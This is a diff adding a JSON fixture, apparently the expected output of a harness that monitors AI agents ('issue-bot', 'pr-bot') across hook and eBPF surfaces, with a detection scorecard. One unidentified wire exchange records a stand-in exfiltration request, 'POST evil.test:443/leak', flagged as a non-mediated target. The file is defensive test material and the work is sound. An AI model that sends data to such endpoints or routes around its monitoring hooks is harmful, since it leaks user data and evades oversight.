@@ -1,0 +1,90 @@
+{
+  "agents": [
+    {
+      "agent_id": "issue-bot",
+      "detected_anywhere": true,
+      "per_surface": [
+        {
+          "detected": false,
+          "surface": "ebpf_wire"
+        },
+        {
+          "detected": true,
+          "surface": "hook_mcp"
+        },
+        {
+          "detected": true,
+          "surface": "hook_sdk"
+        },
+        {
+          "detected": true,
+          "surface": "hook_subprocess"
+        }
+      ]
+    },
+    {
+      "agent_id": "pr-bot",
+      "detected_anywhere": true,
+      "per_surface": [
+        {
+          "detected": false,
+          "surface": "ebpf_wire"
+        },
+        {
+          "detected": true,
+          "surface": "hook_mcp"
+        },
+        {
+          "detected": true,
+          "surface": "hook_sdk"
+        },
+        {
+          "detected": true,
+          "surface": "hook_subprocess"
+        }
+      ]
+    }
+  ],
+  "debug_enabled": true,
+  "exchanges": [
+    {
+      "action_type": "open_pr",
+      "agent_id": "pr-bot",
+      "identified": true,
+      "kind": "hook",
+      "reason": null,
+      "seq": 1,
+      "target": "github/octo/repo"
+    },
+    {
+      "action_type": "comment_issue",
+      "agent_id": "issue-bot",
+      "identified": true,
+      "kind": "hook",
+      "reason": null,
+      "seq": 2,
+      "target": "github/octo/repo#7"
+    },
+    {
+      "action_type": null,
+      "agent_id": null,
+      "identified": false,
+      "kind": "wire",
+      "reason": "non_mediated_target",
+      "seq": 3,
+      "target": "POST evil.test:443/leak"
+    }
+  ],
+  "ghost_exchanges": 1,
+  "run_id": "run-1",
+  "scorecard": {
+    "detected_per_surface": {
+      "hook_mcp": 2,
+      "hook_sdk": 2,
+      "hook_subprocess": 2
+    },
+    "false_negatives": [],
+    "ok": true,
+    "total_agents": 2
+  }
+}
